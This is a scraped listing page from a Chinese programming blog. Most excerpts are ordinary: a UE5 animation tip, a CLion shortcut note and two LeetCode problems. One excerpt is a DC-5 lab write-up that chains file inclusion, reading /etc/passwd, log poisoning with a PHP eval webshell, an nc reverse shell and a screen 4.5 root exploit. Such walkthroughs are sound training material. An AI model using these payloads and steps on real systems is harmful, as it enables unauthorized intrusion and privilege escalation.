	<div class="content list__excerpt post__content clearfix">
		 UE5.1_UMG序列帧动画制作 UMG序列帧动画制作相对比较简单，不像视频帧需要创建媒体播放器那么复杂，以下简要说明：
1. 事件函数 2. 准备序列帧装入数组 3. 构造调用事件函数 4. 预览 序列帧UMG0105
5. 完成！按需配置即可。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbdd350535c977ee20db578c1e863b3b/" rel="bookmark">
			小H靶场笔记：DC-5
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 DC-5 January 5, 2024 10:44 AM
Tags：screen提权
Owner：只惠摸鱼
信息收集 探测靶机ip，大概率为192.168.199.135，且开放端口为80和111
扫描端口80，111相关服务、版本、操作系统、漏洞信息
sudo nmap -sS -O -sV 192.168.199.135 --script=vuln 发现有CSRF漏洞和RPCbind， 百度rpcbind后 发现是ddos漏洞，一般不采用 查看80端口的页面，发现有可能有用的就是contact页面，但XSS没反应。
扫一下目录，看有没有其他有用的
发现有一些php页面，大部分是主页里面可见的功能，有一个奇怪的是footer.php 页面刷新或重新进入时，数字会变。
猜想每个页面下方都有copyriht 即footer.php页面的内容，有可能是使用了include()等方式引入需要包含的文件，载入页面，因此有可能有文件包含漏洞。访问其他页面刷新发现不会动，只有thankyou.php页面会变动，从此页面下手。 漏洞利用 bp抓包，然后进行传参使其等于其中任意页面的php（我是用了index.php)，导入Intruder模块准备爆破变量名，找到能够改变页面脚注的变量，从而执行下一步渗透操作。【我的字典是用的别人的英文字母字典，数量还比较大，不是很好用，有大佬有变量名爆破的字典的话跪求分享一下】
根据返回内容的长度，找到传参的变量名是file
使用参数传入/etc/passwd，可以查看用户，/etc/shadow查看用户密码不行，应该是设置了权限
有文件包含漏洞，然后抓包传入一句话木马，一句话木马需要存储在文件才能连接，所以想到nginx的日志进行写入。
访问nginx的日志目录**/var/log/nginx/access.log或/var/log/nginx/error.log**【一开始我始终进不去，怎么搞都没数据，重启靶机后还是一样，发现爆500，搜了搜感觉应该是我爆破时没有设置线程，打崩了nginx服务器，或者扫目录时扫太多了，内容太多错误了。不得以重新安装一遍。0～0】
nginx日志默认字典路径为/var/log/nginx/access.logaccess.log：指的是访问日志，我们通过访问日志可以获取用户的 IP、请求处理的时间、浏览器信息等error.log：错误日志记录了访问出错的信息，可以用于定位错误的原因 写入马后访问error.log，发现马已写入，尝试蚁剑连接（当然也可以访问url写马，然后看access.log即/&lt;?php @eval($_REQUEST[cmd]);?&gt;
蚁剑连接
反弹shell，进行提权操作
第一种不通，使用nc反弹成功 生成交互性shell
python -c 'import pty;pty.spawn(“/bin/bash”)’
提权 www-data权限较低，尝试寻找suid文件进行提权
发现有一个screen，搜索一下screen提权
千万不要手动编译，手动复现或分步骤复现，就一次性运行sh脚本文件就好【折磨了我一下午，因为手动复现会出现编译版本问题导致无法执行，从而GLIBC版本报错提权失败。除非你再装一个比较老的版本的系统进行编译，我嫌太麻烦，不如直接run】* searchsploit 搜索screen 4.5提权漏洞
下载到本地，之后拖到桌面备用
通过蚁剑上传到/tmp/文件夹
修改文件权限 chmod 777 41154.sh
直接本地反弹shell处运行脚本，一气呵成拿到root
msf反弹shell也可以
生成后门文件
蚁剑上传
msf模块进行监听
给予权限并运行
拿到后上传脚本，修改文件权限并运行
读取/root目录下的flag。GG！
screen提权 Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。一般利用searchsploit搜搜screen中的漏洞，查看相关信息进行利用 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd4ba483f07b74c5e0c28bdbb6af2801/" rel="bookmark">
			CLion - Back - Forward
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CLion - Back - Forward 1. Back - Forward2. Back - ForwardReferences 1. Back - Forward File -&gt; Settings -&gt; Keymap -&gt; Main menu -&gt; Navigate
2. Back - Forward View -&gt; Toolbar
References [1] Yongqiang Cheng, https://yongqiang.blog.csdn.net/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a11141021d7706aa67390671f18d929/" rel="bookmark">
			【算法】链表-20240105
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写目录标题 一、LCR 023. 相交链表二、142. 环形链表 II 一、LCR 023. 相交链表 给定两个单链表的头节点 headA 和 headB ，请找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。
提示：
listA 中节点数目为 m
listB 中节点数目为 n
0 &lt;= m, n &lt;= 3 * 104
1 &lt;= Node.val &lt;= 105
0 &lt;= skipA &lt;= m
0 &lt;= skipB &lt;= n
如果 listA 和 listB 没有交点，intersectVal 为 0
如果 listA 和 listB 有交点，intersectVal == listA[skipA + 1] == listB[skipB + 1]
进阶：能否设计一个时间复杂度 O(n) 、仅用 O(1) 内存的解决方案？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a11141021d7706aa67390671f18d929/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acd1de0edfe559f972bb2ca1d5d6f9c2/" rel="bookmark">
			用队列实现栈oj题——225
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		.
个人主页：晓风飞 专栏：LeetCode刷题|数据结构|Linux 路漫漫其修远兮，吾将上下而求索 文章目录 题目要求：实现 MyStack 类：注意：示例：解释：提示： 解题核心数据结构的定义初始化栈入栈（Push）操作出栈（Pop）操作获取栈顶元素（Top）：检查栈是否为空（Empty）：销毁栈（Free）：以下是队列的实现:以下是本题的实现: 要做题目的点击这里–&gt;栈和队列oj题——225. 用队列实现栈
题目要求： 请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。
实现 MyStack 类： void push(int x) 将元素 x 压入栈顶。
int pop() 移除并返回栈顶元素。
int top() 返回栈顶元素。
boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。
注意： 你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。
你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。
示例： 输入：
[“MyStack”, “push”, “push”, “top”, “pop”, “empty”]
[[], [1], [2], [], [], []]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acd1de0edfe559f972bb2ca1d5d6f9c2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/28/">«</a>
	<span class="pagination__item pagination__item--current">29/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/30/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>